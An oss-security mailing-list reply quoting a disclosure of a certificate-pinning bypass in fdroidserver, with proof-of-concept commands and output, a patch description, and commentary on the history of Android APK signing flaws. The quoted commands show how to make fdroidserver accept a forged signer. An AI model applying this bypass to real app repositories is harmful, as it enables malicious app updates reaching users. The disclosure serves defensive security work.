Received: (qmail 7297 invoked by uid 550); 21 Apr 2024 12:42:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1519 invoked from network); 20 Apr 2024 23:38:47 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1713656319; x=1714261119; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:reply-to:in-reply-to:references
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=AlOnO5/QHXEt13rhGpZi6iXO8Siw2R2LLvGW8oBB54o=;
        b=EUWtHk70fakS9+qw2GmJxRp55ihUJ7BYQBOALs2KTCt3/AZOohuDTHOAkGcMElucHc
         pFwXVDN16ebtd2HlYMmRyLmx1CtRXzIfIfDeF2W3InWrnXpPWh7zeQxjfsNNADJUFWGw
         lgUZ4O1v5b77FQfYxcAHxoL27Exiy0nfh/m4jiRmYZzP9Kz0JxAyVdmuNXTj7PFDmCX1
         wJuxut6A6ENWSxfXy0HzzxKR1YLFgKLauRMwr8HeAcf4wgbpKRXry3Y3dHqzePVRVQ4F
         hhs9w0TUeKXmG6V9Ov8iTDH1ex3yjyLwl82ocZ8iwxvMBpu/PQohv0KAQv9st5ZHkQQE
         9hjA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1713656319; x=1714261119;
        h=to:subject:message-id:date:from:reply-to:in-reply-to:references
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=AlOnO5/QHXEt13rhGpZi6iXO8Siw2R2LLvGW8oBB54o=;
        b=aoNis5CNCR+sUhN4HaWaX7NeJnwxCRkpNxmy4gLnEvATYcX+bpMkVS4EoRi4ahvPHA
         +x7PAvoQHkU1csIo1munGXlxyLjw5Oj/YAe+6n3YQkHrWUrMXXzy4WmWGEJTARAPMeB5
         UbftOQ6IoYRW5xDVthS6rTy5J/WHIzHk5F7jj36Ux02HC+5ZsZj5aRwpDm+tEfRdDUiB
         CfoF2ZvzwsPG6OjrIVlecVlMau5Bwsmh5Zt1miSr1vARWoj4l84L4omLp6WPIBLse9NV
         ODFv4zfp103i/lLDrdt47/utO9oGSR+ssxnEIuy8D6Jp51rX74Xg1JNW/YJuq1O1xDG2
         nmkw==
X-Gm-Message-State: AOJu0YxkEOIG2kx0ntEz8kN3mKL5VAOE9VVahs41Q6PcJIh4p3zn3ENP
	emYkJRI0AGzkupdpT81Vm+flykZ8jG3h1zX0KpUzxB/42WNbCfridjevSrg448Pb8PMNc+sQbEH
	IhizhEd/cJY0gt9x2V3/r4lxgTk/ICkvJ
X-Google-Smtp-Source: AGHT+IEkKiJmM7gbCo0XfY+coh15dC4oH0tTg+VLb5uR7+TFuBfQ0iU9jVQ+HdjXDw5KzBKoKfqQVpEoP9REeqSMmb8=
X-Received: by 2002:a05:6870:592:b0:239:699a:4dce with SMTP id
 m18-20020a056870059200b00239699a4dcemr1938968oap.4.1713656318939; Sat, 20 Apr
 2024 16:38:38 -0700 (PDT)
MIME-Version: 1.0
References: <ZhRBQi_ubFGorfTQ@nihonium>
In-Reply-To: <ZhRBQi_ubFGorfTQ@nihonium>
From: Jeffrey Walton <noloader@gmail.com>
Date: Sat, 20 Apr 2024 19:38:26 -0400
Message-ID: <CAH8yC8nCCXgCJtwRn2FPMrB7PavLT9emh65nT_qca+2hnf2Tyw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000285b7106168fb465"
Subject: Re: [oss-security] PoC for fdroidserver AllowedAPKSigningKeys
 certificate pinning bypass

--000000000000285b7106168fb465
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Mon, Apr 8, 2024 at 3:15=E2=80=AFPM Fay Stegerman <flx@obfusk.net> wrote:

> Hi!
>
> This is published here: https://github.com/obfusk/fdroid-fakesigner-poc.
>
> I've attached the PoC and patch and included the text from the README
> below.
>
> - Fay
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D
>
> # F-Droid Fake Signer PoC
>
> PoC for fdroidserver AllowedAPKSigningKeys certificate pinning bypass.
>
> ## Background
>
> We started looking into Android APK Signing Block oddities at the request
> of
> F-Droid [1] on 2021-08-25; we opened F-Droid issue "APK Signing Block
> considerations" [2] on 2022-10-19.  No action was taken as a result.
>
> We published the "Android APK Signing Block Payload PoC" [3] to the
> Reproducible Builds mailing list [4] on 2023-01-31.
>
> > But the Android APK Signature Scheme v2/v3 actually allows embedding
> > arbitrary data (or code) in the signing block, meaning that two APKs wi=
th
> > the exact same valid signature -- though not a bit-by-bit identical
> > signing block -- can behave differently.
>
> Jason Donenfeld reported "Potential security hazard:
> apk_signer_fingerprint() looks at certs in reverse order that Android
> checks
> them" [5] on 2023-05-05; no action was taken to fix this bug.
>
> > However, there's a discrepancy between how these certificates are
> > extracted and how Android actually implements signature checks. [...]
> > Notice how [the google flowchart [6]] checks v3, then v2, and then v1.
> > Yet the [F-Droid] code above looks at v1, then v2, and then v3, in
> reverse
> > order. So v1 could have a bogus signer that some versions of Android
> never
> > even look at, yet fdroid makes a security decision based on it. Yikes!
> > Also, it's worth noting that apk_signer_fingerprint() also does not
> bother
> > validating that the signatures are correct.
>
> Andreas Itzchak Rehberg (IzzyOnDroid) reported about "BLOBs in APK signing
> blocks" in "Ramping up security: additional APK checks are in place with
> the
> IzzyOnDroid repo" [7] on 2024-03-25.  The accompanying German article
> "Android-Apps auf dem Seziertisch: Eine vertiefte Betrachtung" [8] points
> out that we noticed that that apksigner and androguard handle duplicate
> signing blocks rather differently: the former only sees the first, the
> latter only the last, which allows all kinds of shenanigans.
>
> ## Observations
>
> We observed that embedding a v1 (JAR) signature file in an APK with minSdk
> >=3D 24 will be ignored by Android/apksigner, which only checks v2/v3 in =
that
> case.  However, since fdroidserver checks v1 first, regardless of minSdk,
> and does not verify the signature, it will accept a "fake" certificate and
> see an incorrect certificate fingerprint.
>
> We also realised that the above mentioned discrepancy between apksigner a=
nd
> androguard (which fdroidserver uses to extract the v2/v3 certificates) can
> be abused here as well.  Simply copying the v2/v3 signature from a
> different
> APK and appending it to the APK Signing Block will not affect apksigner's
> verification, but androguard, and thus also fdroidserver, will see only t=
he
> second block.  Again, the signature is not verified, a "fake" certificate
> accepted, and an incorrect fingerprint seen.
>
> As a result, it is trivial to bypass the AllowedAPKSigningKeys certificate
> pinning, as we can make fdroidserver see whatever certificate we want
> instead of the one Android/apksigner does.  Note that we don't need a val=
id
> signature for the APK (we really only need a copy of the DER certificate,
> though having another APK signed with the certificate we want to use makes
> things easy).
>
> ## PoC
>
> NB: you currently need the signing branch of apksigtool [9].
>
> NB: the "fake" signer shown here is from the official F-Droid client (its
> APK has a v1+v2+v3 signature), the one apksigner sees is randomly generat=
ed
> by make-key.sh; the app.apk used for testing had minSdk 26 and a v2
> signature only.  Using APKs with other signature scheme combinations is
> certainly possible, but might require adjusting the PoC code accordingly.
>
> ```
> $ ./make-key.sh             # generates a dummy key
> $ python3 make-poc-v1.py    # uses app.apk (needs minSdk >=3D 24) as base,
> adds fake.apk .RSA
> $ python3 fdroid.py         # verifies and has fake.apk as signer
> according to F-Droid
> True
> 43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
> $ python3 make-poc-v2.py    # uses app.apk as base, adds signing block
> from fake.apk
> $ python3 fdroid.py         # verifies and has fake.apk as signer
> according to F-Droid
> True
> 43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
> $ apksigner verify -v --print-certs poc.apk | grep -E '^Verified
> using|Signer #1 certificate (DN|SHA-256)'
> Verified using v1 scheme (JAR signing): false
> Verified using v2 scheme (APK Signature Scheme v2): true
> Verified using v3 scheme (APK Signature Scheme v3): true
> Verified using v4 scheme (APK Signature Scheme v4): false
> Signer #1 certificate DN: CN=3Doops
> Signer #1 certificate SHA-256 digest:
> 029df1354735e81eb97c9bbef2185c8ead3bc78ae874c03a6e96e1e1435ac519
> ```
>
> ```
> $ mkdir fakesigner
> $ cd fakesigner
> $ fdroid init -d oops --repo-keyalias fakesigner
> $ mkdir metadata
> $ printf 'Name: MyApp\nAllowedAPKSigningKeys:
> 43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab\n' >
> metadata/some.app.id.yml
> $ cp /path/to/poc.apk repo/
> $ fdroid update
> $ jq '.packages[].versions[].manifest.signer.sha256' < repo/index-v2.json
> [
>   "43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab"
> ]
> ```
>
> ## Patch
>
> The fdroidserver.patch changes the order so it matches Android's v3 before
> v2 before v1, and monkey-patches androguard to see the first block instead
> of the last one if there are duplicates.  This is still likely to be
> incomplete, but prevents the known bypasses described here.
>
> ## References
>
> * [1] https://salsa.debian.org/reproducible-builds/diffoscope/-/issues/246
> * [2] https://gitlab.com/fdroid/fdroidserver/-/issues/1056
> * [3] https://github.com/obfusk/sigblock-code-poc
> * [4]
> https://lists.reproducible-builds.org/pipermail/rb-general/2023-January/0=
02825.html
> * [5] https://gitlab.com/fdroid/fdroidserver/-/issues/1128
> * [6] https://source.android.com/docs/security/features/apksigning/v3
> * [7] https://android.izzysoft.de/articles/named/iod-scan-apkchecks
> * [8]
> https://www.kuketz-blog.de/android-apps-auf-dem-seziertisch-eine-vertieft=
e-betrachtung/
> * [9] https://github.com/obfusk/apksigtool
>
> ## Links
>
> * https://github.com/obfusk/apksigcopier


ASOP has been aware their APK signing lacked semantic authentication for
decades. This is from the defunct and now removed android-security-discuss
Google Group. It is a reply of mine on a thread the discusses APK signing
from 2012:

> You should also look at the threat model. [Partially] signed APKs only
> provide the ability to update a previously published APK. The APK can
> be updated *IFF* it was previously published under the same signing
> key. In essence, the threat here is the bad guy will be able to
> provide an update to a good guy's code (which can be farily
> troublesome). Due to the signing model and process, there is no
> effective identity assurances for the users of the APK. So we will
> never really know who the good guy or bad guy is/was.
>
> I say "partially signed" because the signing process violates Schneier
> and Wagner's semantic authentication
> (http://www.schneier.com/paper-ssl.html). Confer: one signs an APK,
> then zip aligns the APK. Will anyone be surprised when Apple and
> Android code signing fails in the field like
> http://www.kb.cert.org/vuls/id/845620
<http://www.kb.cert.org/vuls/id/845620>? Or perhaps un-signed data will
> be used/consumed by an application?

A year later, the Bluebox "Master Key" exploit was released <
https://www.esecurityplanet.com/mobile/inside-the-bluebox-android-master-ke=
y-vulnerability/>.
That was quickly followed by another "Master Key" exploit, <
http://www.androidpolice.com/2013/07/11/second-all-access-apk-exploit-is-re=
vealed-just-two-days-after-master-key-goes-public-already-patched-by-google/
>.

And in 2024, we're again reading about more problems. (Your disclosure).

Android signing will continue to be a problem until signing achieves the
level of semantic authentication as discussed by Wagner and Schneier back
in 1996, <https://www.schneier.com/wp-content/uploads/2016/02/paper-ssl.pdf
>.

Jeff

--000000000000285b7106168fb465--
